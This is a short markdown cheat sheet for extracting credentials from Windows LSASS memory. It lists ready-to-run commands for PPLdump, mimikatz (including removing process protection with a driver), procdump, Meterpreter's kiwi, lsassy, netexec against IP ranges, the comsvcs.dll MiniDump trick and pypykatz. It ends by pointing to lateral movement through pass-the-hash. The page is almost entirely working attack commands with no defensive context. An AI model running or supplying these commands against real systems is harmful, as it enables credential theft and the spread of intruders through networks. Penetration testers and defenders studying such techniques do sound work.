# Extract credentials from LSASS

## Tools: CrackMapExec/Netexec , lsassy , mimikatz , meterpreter , procdump , PPLDump , GUI

#### 1) LSASS as a Protected Process

 - PPLdump64.exe LSASS.EXE|LSASS_PID lsass.dmp

 - mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe:" "!-" (With mimidriver.sys)

#### 2) Procdump

 - Procdump.exe -accepteula -ma lsass.exe lsass.dmp

 - mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"

#### 3) Meterpreter

 - load kiwi

 - creds_all

#### 4) Mimikatz

 - mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

#### 5) lsassy

 - lsassy -d DOMAIN -u USER -p 'PASSWORD' IP

#### 6) CrackMapExec/Netexec

 - netexec smb IP_RANGE -u USER -p 'PASSWORD' -M lsassy

#### 7) rundll32.exe

 - tasklist | findstr lsass

 - C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\temp\LSASS.dmp

#### 8) Pypykatz

 - pypykatz lsa minidump lsass.dmp

### With LSASS dumped, you can recover NTLM Hashes as well as clertext credentials to do Lateral Movement via Pass-the-Hash or Pass-the-Key

